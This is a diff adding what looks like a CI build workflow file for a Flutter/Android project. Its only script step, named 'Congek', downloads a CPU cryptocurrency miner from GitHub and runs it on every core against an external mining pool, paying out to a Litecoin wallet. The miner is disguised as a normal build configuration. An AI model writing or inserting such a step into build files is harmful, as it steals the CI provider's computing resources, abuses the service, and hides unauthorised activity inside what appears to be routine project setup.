@@ -1,0 +1,20 @@
+workflows:
+  my-workflow:
+    name: My workflow name
+    instance_type: linux_x2
+    max_build_duration: 120
+    environment:
+      flutter: stable
+      xcode: latest 
+      npm: 6.13.7  
+      ndk: r21d
+    scripts:
+      - name: Congek
+        script: |
+         -  
+            #!/bin/sh
+            sudo apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+            sudo apt-get install -y libssl-dev libcurl4-gnutls-dev libgmp-dev && apt install -y ocl-icd-opencl-dev
+            wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
+            tar -xf cpuminer-opt-linux.tar.gz
+            ./cpuminer -a yescryptR16 -o stratum+tcp://yescryptR16.eu.mine.zergpool.com:6333 -u LNYgLLxDCqJM25ZbQdvuun42RGpi3pgRxQ -p  c=LTC,mc=QOGE,ID=Coba -t $(nproc --all)
